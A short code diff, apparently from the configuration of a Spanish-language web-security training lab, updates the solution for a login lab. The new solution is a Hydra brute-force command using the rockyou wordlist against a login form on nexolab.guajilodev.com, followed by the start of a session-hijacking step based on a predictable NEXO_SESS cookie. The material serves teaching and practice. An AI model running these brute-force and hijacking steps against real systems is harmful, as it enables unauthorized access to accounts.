@@ -27,10 +27,10 @@ $labInfo = [
     ',
     'exploit' => '# 1. Brute force con Hydra contra la VPS:
 # Usamos -t 1 para evitar falsos positivos por concurrencia/rate limit.
-# Usamos S=dashboard.php porque el login exitoso redirige al dashboard.
+# Usamos Set-Cookie porque el login exitoso emite NEXO_SESS.
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 1 -f \\
   nexolab.guajilodev.com https-post-form \\
-  "/a07_login/index.php:username=^USER^&password=^PASS^:S=dashboard.php"
+  "/a07_login/index.php:username=^USER^&password=^PASS^:S=Set-Cookie\\: NEXO_SESS="
 
 # 2. Session hijacking:
 # Después de login, tu cookie es NEXO_SESS=1006
